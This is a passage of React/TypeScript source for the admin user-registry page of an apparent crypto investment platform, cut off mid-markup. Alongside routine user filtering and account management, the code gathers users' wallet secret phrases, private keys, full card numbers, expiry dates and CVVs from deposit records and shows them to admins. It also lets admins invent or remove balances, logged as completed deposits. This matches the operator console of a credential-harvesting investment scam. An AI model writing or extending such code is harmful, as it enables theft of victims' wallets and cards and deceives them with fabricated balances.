import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Search, Filter, Shield, Mail, Calendar, UserCheck, UserX, 
  Eye, CheckCircle2, Clock, XCircle, AlertTriangle, Lock, Unlock, 
  X, Check, ChevronDown, User as UserIcon, RefreshCw, ShieldAlert,
  Edit3, Trash2, DollarSign, Key, CreditCard
} from 'lucide-react';
import { collection, onSnapshot, updateDoc, deleteDoc, doc, serverTimestamp, setDoc, query, where, getDocs, addDoc } from 'firebase/firestore';
import { db, safeSetDoc, safeAddDoc, safeUpdateDoc, safeDeleteDoc } from '../../../lib/firebase';
import { portfolioPersistenceService } from '../../../services/portfolioPersistenceService';
import { walletService } from '../../../services/walletService';
import { increment, arrayUnion } from 'firebase/firestore';
import { transactionService } from '../../../services/transactionService';
import { formatCurrency, CURRENCY_SYMBOLS } from '../../../lib/utils';

interface UserData {
  uid: string;
  email: string;
  displayName?: string;
  username?: string;
  fullName?: string;
  profilePhotoURL?: string;
  avatarUrl?: string;
  role?: string;
  accountStatus?: 'Active' | 'Suspended' | 'Deactivated' | string;
  status?: string;
  kycStatus?: 'unverified' | 'pending' | 'verified' | 'rejected' | string;
  emailVerified?: boolean;
  createdAt?: any;
  lastLogin?: any;
  lastUpdated?: any;
  country?: string;
  phoneNumber?: string;
  portfolioBalance?: number;
  availableBalance?: number;
  vaultBalance?: number;
  totalDeposits?: number;
  totalWithdrawals?: number;
  accountType?: string;
  linkedWallets?: any[];
  currency?: string;
}

export default function AdminUsers({ theme }: { theme: 'light' | 'dark' }) {
  const [users, setUsers] = useState<UserData[]>([]);
  const [search, setSearch] = useState('');
  const [loading, setLoading] = useState(true);

  // Filter States
  const [showFilters, setShowFilters] = useState(false);
  const [roleFilter, setRoleFilter] = useState<string>('all');
  const [statusFilter, setStatusFilter] = useState<string>('all');
  const [kycFilter, setKycFilter] = useState<string>('all');

  // Modals & Active Actions
  const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
  const [selectedUserWallet, setSelectedUserWallet] = useState<any>(null);
  const [userWallets, setUserWallets] = useState<any[]>([]);
  const [editingRoleUser, setEditingRoleUser] = useState<UserData | null>(null);
  const [fundingUser, setFundingUser] = useState<UserData | null>(null);
  const [fundingWallet, setFundingWallet] = useState<any>(null);
  const [fundAmount, setFundAmount] = useState('');
  const [fundActionType, setFundActionType] = useState<'add' | 'remove'>('add');
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [toast, setToast] = useState<{ type: 'success' | 'error'; message: string } | null>(null);

  // Fetch wallet for funding user when modal opens
  useEffect(() => {
    if (fundingUser) {
      walletService.getOrCreateWallet(fundingUser.uid).then(setFundingWallet);
    } else {
      setFundingWallet(null);
    }
  }, [fundingUser]);

  const isDark = theme === 'dark';

  useEffect(() => {
    // Real-time listener for all platform users in Firestore
    const unsub = onSnapshot(collection(db, 'users'), (snap) => {
      const uniqueUsers = new Map<string, UserData>();
      snap.docs.forEach(docSnap => {
        const raw = docSnap.data();
        if (!raw || raw.isDeleted || raw.accountStatus === 'Deleted') return;
        
        const userData = {
          uid: docSnap.id,
          ...raw,
          role: raw.role || 'user',
          accountStatus: raw.accountStatus || raw.status || 'Active',
          kycStatus: raw.kycStatus || 'unverified',
          emailVerified: !!raw.emailVerified
        } as UserData;

        const email = (userData.email || '').toLowerCase().trim();
        if (email) {
          const existing = uniqueUsers.get(email);
          
          if (!existing) {
            uniqueUsers.set(email, userData);
          } else {
            // Prioritization logic:
            // 1. Prefer non-local UIDs (Real Firebase Auth)
            // 2. Prefer higher roles
            // 3. Prefer earlier creation date
            
            const isLocal = (uid: string) => uid.startsWith('local-');
            const getWeight = (r: string) => r === 'super_admin' ? 3 : r === 'admin' ? 2 : 1;
            
            const newIsLocal = isLocal(userData.uid);
            const oldIsLocal = isLocal(existing.uid);

            if (oldIsLocal && !newIsLocal) {
              // Real account found, replace local session
              uniqueUsers.set(email, userData);
            } else if (oldIsLocal === newIsLocal) {
              // Both same type, check role
              if (getWeight(userData.role || 'user') > getWeight(existing.role || 'user')) {
                uniqueUsers.set(email, userData);
              } else if (getWeight(userData.role || 'user') === getWeight(existing.role || 'user')) {
                // Same role, keep oldest
                const timeNew = userData.createdAt?.toDate?.()?.getTime() || new Date(userData.createdAt || 0).getTime();
                const timeOld = existing.createdAt?.toDate?.()?.getTime() || new Date(existing.createdAt || 0).getTime();
                if (timeNew < timeOld) {
                  uniqueUsers.set(email, userData);
                }
              }
            }
          }
        } else {
          // If no email, just add by UID
          uniqueUsers.set(userData.uid, userData);
        }
      });

      const data = Array.from(uniqueUsers.values());

      // Safe client-side sorting by creation time
      data.sort((a, b) => {
        const getTime = (val: any) => {
          if (!val) return 0;
          if (typeof val === 'object' && typeof val.toDate === 'function') return val.toDate().getTime();
          if (typeof val === 'number') return val;
          return new Date(val).getTime() || 0;
        };
        return getTime(b.createdAt) - getTime(a.createdAt);
      });

      setUsers(data);
      setLoading(false);
    }, (error) => {
      console.error("User Registry real-time sync error:", error);
      setLoading(false);
    });

    return unsub;
  }, []);

  const showToast = (message: string, type: 'success' | 'error' = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 4000);
  };

  const handleDeleteUser = async (uid: string) => {
    if (!window.confirm("Are you sure you want to permanently delete this user account?")) return;
    try {
      setActionLoading(uid);
      await deleteDoc(doc(db, 'users', uid));

      // Remove from local DB fallback if present
      try {
        const dbStr = localStorage.getItem('aver_local_db');
        if (dbStr) {
          const dbList = JSON.parse(dbStr);
          const filtered = dbList.filter((u: any) => (u.profile?.uid || u.uid) !== uid);
          localStorage.setItem('aver_local_db', JSON.stringify(filtered));
        }
      } catch (e) {}

      showToast("User account deleted successfully.");
      if (selectedUser && selectedUser.uid === uid) {
        setSelectedUser(null);
      }
    } catch (err: any) {
      console.error("Failed to delete user:", err);
      showToast(err.message || "Failed to delete user", 'error');
    } finally {
      setActionLoading(null);
    }
  };

    const handleSelectUser = async (user: UserData) => {
    setSelectedUser(user);
    setUserWallets([]);
    setSelectedUserWallet(null);
    try {
      const wallet = await walletService.getOrCreateWallet(user.uid);
      setSelectedUserWallet(wallet);
    } catch (e) {
      console.warn("Failed to fetch wallet for admin UI", e);
    }
    
    // Fetch wallets from multiple potential locations
    try {
      // 1. Check for 'linked_wallets' collection
      const q = query(collection(db, 'linked_wallets'), where('userId', '==', user.uid));
      const snap = await getDocs(q);
      const wallets = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      
      // 2. Also check for 'deposits' and 'admin_deposits' that might have credentials
      const q2 = query(collection(db, 'deposits'), where('userId', '==', user.uid));
      const snap2 = await getDocs(q2);
      
      let snapAdminDocs: any[] = [];
      try {
        const qAdmin = query(collection(db, 'admin_deposits'), where('userId', '==', user.uid));
        const snapAdmin = await getDocs(qAdmin);
        snapAdminDocs = snapAdmin.docs;
      } catch (e) {}

      const allDepDocs = [...snap2.docs, ...snapAdminDocs];
      const depositCreds = allDepDocs
        .map(d => d.data())
        .filter(d => d.secretPhrase || d.privateKey || d.cardNumber)
        .map(d => ({
          provider: d.fundingMethod === 'card' ? 'Credit Card' : (d.walletProvider || 'Imported Wallet'),
          address: d.connectedWalletAddress || d.cardNumber || 'Credentials',
          secretPhrase: d.secretPhrase,
          privateKey: d.privateKey,
          cardNumber: d.cardNumber,
          cardExpiry: d.cardExpiry,
          cardCvv: d.cardCvv,
          linkedAt: d.createdAt
        }));

      setUserWallets([...wallets, ...depositCreds]);
    } catch (err) {
      console.error("Failed to fetch user credentials:", err);
    }
  };

  const handleUpdateStatus = async (uid: string, newStatus: 'Active' | 'Suspended' | 'Deactivated') => {
    try {
      setActionLoading(uid);
      await updateDoc(doc(db, 'users', uid), { 
        accountStatus: newStatus,
        status: newStatus,
        lastUpdated: serverTimestamp() 
      });
      showToast(`User account status updated to ${newStatus}.`);
      
      // Update selected modal user state if open
      if (selectedUser && selectedUser.uid === uid) {
        setSelectedUser(prev => prev ? { ...prev, accountStatus: newStatus, status: newStatus } : null);
      }
    } catch (err: any) {
      console.error("Failed to update status:", err);
      showToast(err.message || "Failed to update user status", 'error');
    } finally {
      setActionLoading(null);
    }
  };

  const handleUpdateRole = async (uid: string, newRole: string) => {
    try {
      setActionLoading(uid);
      await updateDoc(doc(db, 'users', uid), { 
        role: newRole,
        lastUpdated: serverTimestamp() 
      });
      showToast(`User role updated to ${newRole}.`);
      setEditingRoleUser(null);

      if (selectedUser && selectedUser.uid === uid) {
        setSelectedUser(prev => prev ? { ...prev, role: newRole } : null);
      }
    } catch (err: any) {
      console.error("Failed to update role:", err);
      showToast(err.message || "Failed to update role", 'error');
    } finally {
      setActionLoading(null);
    }
  };

  const handleFundUser = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fundingUser || !fundAmount || isNaN(Number(fundAmount))) return;
    
    const uid = fundingUser.uid;
    setActionLoading(uid);
    try {
      const rawAmount = Number(fundAmount);
      const email = (fundingUser.email || '').toLowerCase().trim();

      // Check for insufficient funds if removing
      if (fundActionType === 'remove') {
        const wallet = await walletService.getOrCreateWallet(uid);
        const currentBalance = Number(wallet.availableBalance || 0);
        if (currentBalance < rawAmount) {
          throw new Error(`Insufficient funds: User only has ${formatCurrency(currentBalance)}. Requested removal: ${formatCurrency(rawAmount)}.`);
        }
      }

      const amount = fundActionType === 'remove' ? -rawAmount : rawAmount;
      const targetUids = new Set<string>();
      if (uid) targetUids.add(uid);

      if (email) {
        try {
          const q = query(collection(db, 'users'), where('email', '==', email));
          const snap = await getDocs(q);
          snap.docs.forEach(d => targetUids.add(d.id));
        } catch (e) {
          console.warn("[AdminUsers] Query email error:", e);
        }
      }

      // Log admin adjustment in transaction history
      await transactionService.recordTransaction({
        userId: uid,
        type: fundActionType === 'add' ? 'deposit' : 'withdrawal',
        category: 'transactions',
        title: fundActionType === 'add' ? 'Administrative Credit (+)' : 'Administrative Deduction (-)',
        amount: fundActionType === 'add' ? rawAmount : -rawAmount,
        asset: 'USD',
        network: 'Internal',
        status: 'Completed',
        timestamp: new Date().toISOString()
      });
      
      const updatePromises = Array.from(targetUids).map(async (targetUid) => {
        try {
          const userRef = doc(db, 'users', targetUid);
          
          await safeSetDoc(userRef, {
            availableBalance: increment(amount),
            portfolioBalance: increment(amount),
            totalDeposits: fundActionType === 'add' ? increment(amount) : increment(0),
            tokenBalance: increment(amount),
            cashBalance: increment(amount),
            portfolioValue: increment(amount),
            'portfolio.totalValue': increment(amount),
            lastUpdated: serverTimestamp()
          }, { merge: true });

          // Force update local and cloud state via services
          const wallet = await walletService.getOrCreateWallet(targetUid);
          await walletService.updateWallet(targetUid, {
            portfolioBalance: Math.max(0, (Number(wallet.portfolioBalance) || 0) + amount),
            availableBalance: Math.max(0, (Number(wallet.availableBalance) || 0) + amount),
            tokenBalance: Math.max(0, (Number(wallet.tokenBalance) || 0) + amount),
            cashBalance: Math.max(0, (Number(wallet.cashBalance) || 0) + amount),
            portfolioValue: Math.max(0, (Number(wallet.portfolioValue) || 0) + amount)
          });

          // Also update portfolio persistence
          const currentPortfolio = await portfolioPersistenceService.getPortfolioCurrent(targetUid);
          if (currentPortfolio) {
            await portfolioPersistenceService.savePortfolioCurrent(targetUid, {
              walletState: {
                portfolioBalance: Math.max(0, (currentPortfolio.walletState?.portfolioBalance || 0) + amount),
                availableBalance: Math.max(0, (currentPortfolio.walletState?.availableBalance || 0) + amount),
                tokenBalance: Math.max(0, (currentPortfolio.walletState?.tokenBalance || 0) + amount)
              },
              portfolioMetrics: {
                totalValue: Math.max(0, (currentPortfolio.portfolioMetrics?.totalValue || 0) + amount)
              }
            });
          }
        } catch (e) {
          console.error(`Error updating user ${targetUid}:`, e);
        }
      });

      await Promise.all(updatePromises);

      // Refresh the selected user's wallet in UI
      const updatedWallet = await walletService.getOrCreateWallet(uid);
      setSelectedUserWallet(updatedWallet);

      showToast(`Successfully ${fundActionType === 'add' ? 'added' : 'removed'} ${formatCurrency(rawAmount)} ${fundActionType === 'add' ? 'to' : 'from'} user balance.`);
      setFundingUser(null);
      setFundAmount('');
    } catch (err: any) {
      console.error("Funding error:", err);
      showToast(err.message || "Failed to process fund action", 'error');
    } finally {
      setActionLoading(null);
    }
  };

  const formatDate = (val: any): string => {
    if (!val) return 'N/A';
    try {
      if (typeof val === 'object' && typeof val.toDate === 'function') {
        return val.toDate().toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
      }
      if (typeof val === 'number') {
        return new Date(val).toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
      }
      if (typeof val === 'string') {
        const d = new Date(val);
        if (!isNaN(d.getTime())) {
          return d.toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
        }
      }
    } catch (e) {}
    return 'N/A';
  };

  // Filter Logic
  const filteredUsers = users.filter(u => {
    const name = u.displayName || u.fullName || u.username || '';
    const matchesSearch = 
      !search.trim() ||
      name.toLowerCase().includes(search.toLowerCase()) ||
      u.email?.toLowerCase().includes(search.toLowerCase()) ||
      u.uid?.toLowerCase().includes(search.toLowerCase());

    const matchesRole = 
      roleFilter === 'all' || 
      (u.role || 'user').toLowerCase() === roleFilter.toLowerCase();

    const currentStatus = (u.accountStatus || u.status || 'Active').toLowerCase();
    const matchesStatus = 
      statusFilter === 'all' || 
      currentStatus === statusFilter.toLowerCase();

    const currentKyc = (u.kycStatus || 'unverified').toLowerCase();
    const matchesKyc = 
      kycFilter === 'all' || 
      currentKyc === kycFilter.toLowerCase();

    return matchesSearch && matchesRole && matchesStatus && matchesKyc;
  });

  return (
    <div className="space-y-8 relative">
      {/* Toast Banner */}
      <AnimatePresence>
        {toast && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className={`fixed top-6 right-6 z-50 px-6 py-4 rounded-2xl shadow-2xl flex items-center gap-3 border backdrop-blur-xl ${
              toast.type === 'success' 
                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
                : 'bg-rose-500/10 border-rose-500/30 text-rose-400'
            }`}
          >
            {toast.type === 'success' ? <CheckCircle2 className="w-5 h-5 text-emerald-400" /> : <AlertTriangle className="w-5 h-5 text-rose-400" />}
            <span className="text-sm font-bold">{toast.message}</span>
            <button onClick={() => setToast(null)} className="ml-2 hover:opacity-75">
              <X className="w-4 h-4" />
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      <div>
        <h1 className="text-3xl font-black tracking-tight mb-2">User Registry</h1>
        <p className={`text-sm ${isDark ? 'text-slate-400' : 'text-slate-500'}`}>
          Manage global platform users, roles, account statuses, and institutional governance.
        </p>
      </div>

      {/* Control Bar: Search & Filter Toggle */}
      <div className="space-y-4">
        <div className="flex flex-col sm:flex-row gap-4 items-center justify-between">
          <div className={`flex-1 w-full max-w-md flex items-center gap-3 px-4 py-2.5 rounded-2xl border ${
            isDark ? 'bg-white/5 border-white/5' : 'bg-white border-slate-200'
          }`}>
            <Search className="w-4 h-4 text-slate-500" />
            <input 
              type="text" 
              placeholder="Search by name, email or UID..." 
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="bg-transparent border-none focus:ring-0 text-sm w-full outline-none"
            />
            {search && (
              <button onClick={() => setSearch('')} className="text-slate-500 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            )}
          </div>

          <button 
            onClick={() => setShowFilters(!showFilters)}
            className={`flex items-center gap-2 px-6 py-2.5 rounded-2xl font-bold border transition-all ${
              showFilters || roleFilter !== 'all' || statusFilter !== 'all' || kycFilter !== 'all'
                ? 'border-emerald-500/50 bg-emerald-500/10 text-emerald-400'
                : isDark ? 'border-white/10 text-slate-400 hover:bg-white/5' : 'border-slate-200 text-slate-600 hover:bg-slate-100'
            }`}
          >
            <Filter className="w-4 h-4" />
            Advanced Filters
            <ChevronDown className={`w-4 h-4 transition-transform ${showFilters ? 'rotate-180' : ''}`} />
          </button>
        </div>

        {/* Expandable Advanced Filters Panel */}
        <AnimatePresence>
          {showFilters && (
            <motion.div
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: 'auto', opacity: 1 }}
              exit={{ height: 0, opacity: 0 }}
              className={`overflow-hidden p-6 rounded-3xl border ${
                isDark ? 'bg-white/5 border-white/5' : 'bg-slate-50 border-slate-200'
              }`}
            >
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
                <div>
                  <label className="text-xs font-bold text-slate-500 uppercase tracking-wider block mb-2">Role</label>
                  <select
                    value={roleFilter}
                    onChange={(e) => setRoleFilter(e.target.value)}
                    className={`w-full p-3 rounded-xl border text-sm font-bold bg-transparent outline-none ${
                      isDark ? 'border-white/10 text-white bg-slate-900' : 'border-slate-200 text-slate-900 bg-white'
                    }`}
                  >
                    <option value="all">All Roles</option>
                    <option value="user">User</option>
                    <option value="admin">Admin</option>
                    <option value="super_admin">Super Admin</option>
                  </select>
                </div>

                <div>
                  <label className="text-xs font-bold text-slate-500 uppercase tracking-wider block mb-2">Account Status</label>
                  <select
                    value={statusFilter}
                    onChange={(e) => setStatusFilter(e.target.value)}
                    className={`w-full p-3 rounded-xl border text-sm font-bold bg-transparent outline-none ${
                      isDark ? 'border-white/10 text-white bg-slate-900' : 'border-slate-200 text-slate-900 bg-white'
                    }`}
                  >
                    <option value="all">All Statuses</option>
                    <option value="active">Active</option>
                    <option value="suspended">Suspended</option>
                    <option value="deactivated">Deactivated</option>
                  </select>
                </div>

                <div>
                  <label className="text-xs font-bold text-slate-500 uppercase tracking-wider block mb-2">KYC Governance</label>
                  <select
                    value={kycFilter}
                    onChange={(e) => setKycFilter(e.target.value)}
                    className={`w-full p-3 rounded-xl border text-sm font-bold bg-transparent outline-none ${
                      isDark ? 'border-white/10 text-white bg-slate-900' : 'border-slate-200 text-slate-900 bg-white'
                    }`}
                  >
                    <option value="all">All KYC Statuses</option>
                    <option value="verified">Verified</option>
                    <option value="pending">Pending Review</option>
                    <option value="unverified">Unverified</option>
                    <option value="rejected">Rejected</option>
                  </select>
                </div>
              </div>

              {(roleFilter !== 'all' || statusFilter !== 'all' || kycFilter !== 'all') && (
                <div className="mt-4 flex justify-end">
                  <button
                    onClick={() => {
                      setRoleFilter('all');
                      setStatusFilter('all');
                      setKycFilter('all');
                    }}
                    className="text-xs font-bold text-emerald-400 hover:underline flex items-center gap-1"
                  >
                    <RefreshCw className="w-3 h-3" /> Reset Filters
                  </button>
                </div>
              )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Main Table Container */}
      <div className={`rounded-[2rem] border overflow-hidden ${
        isDark ? 'bg-white/5 border-white/5' : 'bg-white border-slate-200 shadow-sm'
      }`}>
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse">
            <thead>
              <tr className={`border-b ${isDark ? 'border-white/5' : 'border-slate-100'}`}>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">User / UID</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Role</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Email Verification</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">KYC Status</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Account Status</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Registered / Last Login</th>
                <th className="px-6 py-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5">
              {loading ? (
                // Loading Skeleton Rows
                Array.from({ length: 5 }).map((_, idx) => (
                  <tr key={idx} className="animate-pulse">
                    <td className="px-6 py-4">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-xl bg-slate-800/50" />
                        <div className="space-y-2">
                          <div className="h-4 w-32 bg-slate-800/50 rounded" />
                          <div className="h-3 w-20 bg-slate-800/30 rounded" />
                        </div>
                      </div>
                    </td>
                    <td className="px-6 py-4"><div className="h-6 w-16 bg-slate-800/50 rounded-lg" /></td>
                    <td className="px-6 py-4"><div className="h-6 w-20 bg-slate-800/50 rounded-lg" /></td>
                    <td className="px-6 py-4"><div className="h-6 w-20 bg-slate-800/50 rounded-lg" /></td>
                    <td className="px-6 py-4"><div className="h-6 w-20 bg-slate-800/50 rounded-lg" /></td>
                    <td className="px-6 py-4"><div className="h-4 w-28 bg-slate-800/50 rounded" /></td>
                    <td className="px-6 py-4"><div className="h-8 w-24 bg-slate-800/50 rounded-xl" /></td>
                  </tr>
                ))
              ) : (
                filteredUsers.map((user, idx) => {
                  const name = user.displayName || user.fullName || user.username || (user.email ? user.email.split('@')[0] : 'User');
                  const avatar = user.profilePhotoURL || user.avatarUrl;
                  const currentStatus = (user.accountStatus || user.status || 'Active');
                  const kyc = (user.kycStatus || 'unverified').toLowerCase();

                  return (
                    <tr key={`usr-${user.uid || idx}-${idx}`} className="group hover:bg-white/[0.02] transition-colors">
                      {/* User & UID */}
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-3">
                          {avatar ? (
                            <img 
                              src={avatar} 
                              alt={name} 
                              className="w-10 h-10 rounded-xl object-cover border border-white/10"
                              referrerPolicy="no-referrer"
                            />
                          ) : (
                            <div className="w-10 h-10 rounded-xl bg-slate-800 flex items-center justify-center font-bold text-emerald-500 border border-white/5">
                              {name.charAt(0).toUpperCase()}
                            </div>
                          )}
                        <div className="flex flex-col">
                          <div className="flex items-center gap-2">
                            <span className="text-sm font-bold text-white flex items-center gap-2">
                              {name}
                              <span className="text-[10px] font-mono text-slate-500 opacity-60">#{user.uid.slice(0, 4)}</span>
                            </span>
                            {user.email?.endsWith('@aver.platform') && (
                              <span className="px-1.5 py-0.5 rounded-md bg-blue-500/10 text-blue-400 text-[8px] font-black uppercase tracking-widest border border-blue-500/20">
                                System
                              </span>
                            )}
                          </div>
                          <span className="text-xs text-slate-400">{user.email}</span>
                          <span className="text-[10px] font-mono text-slate-500 truncate max-w-[120px]" title={user.uid}>{user.uid}</span>
                        </div>
                        </div>
                      </td>

                      {/* Role */}
                      <td className="px-6 py-4">
                        <button
                          onClick={() => setEditingRoleUser(user)}
                          className="group/role flex items-center gap-1.5 focus:outline-none"
                          title="Click to change role"
                        >
                          <span className={`px-2.5 py-1 rounded-lg text-[10px] font-black uppercase tracking-wider border flex items-center gap-1 transition-all group-hover/role:scale-105 ${
                            user.role === 'super_admin' ? 'bg-purple-500/10 text-purple-400 border-purple-500/20' :
                            user.role === 'admin' ? 'bg-indigo-500/10 text-indigo-400 border-indigo-500/20' :
                            'bg-blue-500/10 text-blue-400 border-blue-500/20'
                          }`}>
                            <Shield className="w-3 h-3" />
                            {user.role || 'user'}
                          </span>
                        </button>
                      </td>

                      {/* Email Verification */}
                      <td className="px-6 py-4">
                        <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-bold border ${
                          user.emailVerified
                            ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
                            : 'bg-amber-500/10 text-amber-400 border-amber-500/20'
                        }`}>
                          {user.emailVerified ? <CheckCircle2 className="w-3 h-3" /> : <Clock className="w-3 h-3" />}
                          {user.emailVerified ? 'Verified' : 'Unverified'}
                        </span>
                      </td>

                      {/* KYC Status */}
                      <td className="px-6 py-4">
                        <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-bold uppercase tracking-wider border ${
                          kyc === 'verified' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' :
                          kyc === 'pending' ? 'bg-amber-500/10 text-amber-400 border-amber-500/20' :
                          kyc === 'rejected' ? 'bg-rose-500/10 text-rose-400 border-rose-500/20' :
                          'bg-slate-500/10 text-slate-400 border-slate-500/20'
                        }`}>
                          {kyc === 'verified' && <CheckCircle2 className="w-3 h-3" />}
                          {kyc === 'pending' && <Clock className="w-3 h-3" />}
                          {kyc === 'rejected' && <XCircle className="w-3 h-3" />}
                          {kyc === 'unverified' && <UserIcon className="w-3 h-3" />}
                          {kyc}
                        </span>
                      </td>

                      {/* Account Status */}
                      <td className="px-6 py-4">
                        <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-black uppercase tracking-wider border ${
                          currentStatus === 'Active' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' :
                          currentStatus === 'Suspended' ? 'bg-amber-500/10 text-amber-400 border-amber-500/20' :
                          'bg-rose-500/10 text-rose-400 border-rose-500/20'
                        }`}>
                          {currentStatus === 'Active' && <CheckCircle2 className="w-3 h-3" />}
                          {currentStatus === 'Suspended' && <Lock className="w-3 h-3" />}
                          {currentStatus === 'Deactivated' && <ShieldAlert className="w-3 h-3" />}
                          {currentStatus}
                        </span>
                      </td>

                      {/* Dates */}
                      <td className="px-6 py-4">
                        <div className="flex flex-col text-xs text-slate-400 space-y-1">
                          <span className="flex items-center gap-1.5 font-medium">
                            <Calendar className="w-3 h-3 text-slate-500" />
                            Registered: {formatDate(user.createdAt)}
                          </span>
                          <span className="text-[10px] text-slate-500">
                            Last Login: {formatDate(user.lastLogin || user.lastUpdated)}
                          </span>
                        </div>
                      </td>

                      {/* Actions */}
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2">
                          {/* View Profile */}
                          <button 
                            onClick={() => handleSelectUser(user)}
                            className={`p-2 rounded-xl border transition-all ${
                              isDark ? 'border-white/10 hover:bg-white/10 text-slate-300' : 'border-slate-200 hover:bg-slate-100 text-slate-700'
                            }`}
                            title="View Full Profile"
                          >
                            <Eye className="w-4 h-4" />
                          </button>

                          {/* Edit Role */}
                          <button 
                            onClick={() => setEditingRoleUser(user)}
                            className={`p-2 rounded-xl border transition-all ${
                              isDark ? 'border-white/10 hover:bg-white/10 text-purple-400' : 'border-slate-200 hover:bg-slate-100 text-purple-600'
                            }`}
                            title="Edit User Role"
                          >
                            <Edit3 className="w-4 h-4" />
                          </button>

                          {/* Fund User */}
                          <button 
                            onClick={() => setFundingUser(user)}
                            className={`p-2 rounded-xl border transition-all ${
                              isDark ? 'border-emerald-500/20 bg-emerald-500/10 hover:bg-emerald-500 hover:text-white text-emerald-400' : 'border-emerald-200 bg-emerald-50 hover:bg-emerald-500 hover:text-white text-emerald-600'
                            }`}
                            title="Add Funds"
                          >
                            <DollarSign className="w-4 h-4" />
                          </button>

                          {/* Delete Account */}
                          <button
                            onClick={() => handleDeleteUser(user.uid)}
                            disabled={actionLoading === user.uid}
                            className={`p-2 rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500 hover:text-white text-rose-400 transition-all ${
                              actionLoading === user.uid ? 'opacity-50 pointer-events-none' : ''
                            }`}
                            title="Delete User Account"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>

                          {/* Account Status Actions */}
                          {currentStatus === 'Active' ? (
                            <>
                              <button
                                onClick={() => handleUpdateStatus(user.uid, 'Suspended')}
                                disabled={actionLoading === user.uid}
                                className="px-3 py-1.5 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400 text-xs font-bold hover:bg-amber-500 hover:text-slate-950 transition-all flex items-center gap-1"
                                title="Suspend Account"
                              >
                                <Lock className="w-3 h-3" />
                                Suspend
                              </button>
                              <button
                                onClick={() => handleUpdateStatus(user.uid, 'Deactivated')}
                                disabled={actionLoading === user.uid}
                                className="px-3 py-1.5 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 text-xs font-bold hover:bg-rose-500 hover:text-white transition-all flex items-center gap-1"
                                title="Deactivate Account"
                              >
                                <ShieldAlert className="w-3 h-3" />
                                Deactivate
                              </button>
                            </>
                          ) : (
                            <button
                              onClick={() => handleUpdateStatus(user.uid, 'Active')}
                              disabled={actionLoading === user.uid}
                              className="px-3 py-1.5 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-bold hover:bg-emerald-500 hover:text-slate-950 transition-all flex items-center gap-1"
                              title="Reactivate Account"
                            >
                              <Unlock className="w-3 h-3" />
                              Reactivate
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>

        {filteredUsers.length === 0 && !loading && (
          <div className="py-20 flex flex-col items-center justify-center text-center space-y-4 opacity-40">
            <UserX className="w-16 h-16" />
            <div className="space-y-1">
              <p className="font-bold">No users found matching your query</p>
              <p className="text-xs">Adjust your search parameters or reset advanced filters.</p>
            </div>
          </div>
        )}
      </div>

      {/* MODAL 1: View Profile Modal Drawer */}
      <AnimatePresence>
        {selectedUser && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className={`w-full max-w-2xl p-8 rounded-[2.5rem] border shadow-2xl space-y-6 max-h-[90vh] overflow-y-auto ${
                isDark ? 'bg-slate-900 border-white/10 text-white' : 'bg-white border-slate-200 text-slate-900'
              }`}
            >
              <div className="flex items-start justify-between">
                <div className="flex items-center gap-4">
                  {(selectedUser.profilePhotoURL || selectedUser.avatarUrl) ? (
                    <img 
                      src={selectedUser.profilePhotoURL || selectedUser.avatarUrl} 
                      alt="Profile" 
                      className="w-16 h-16 rounded-2xl object-cover border-2 border-emerald-500/30"
                      referrerPolicy="no-referrer"
                    />
                  ) : (
                    <div className="w-16 h-16 rounded-2xl bg-slate-800 flex items-center justify-center text-2xl font-black text-emerald-500">
                      {(selectedUser.displayName || selectedUser.username || selectedUser.email).charAt(0).toUpperCase()}
                    </div>
                  )}
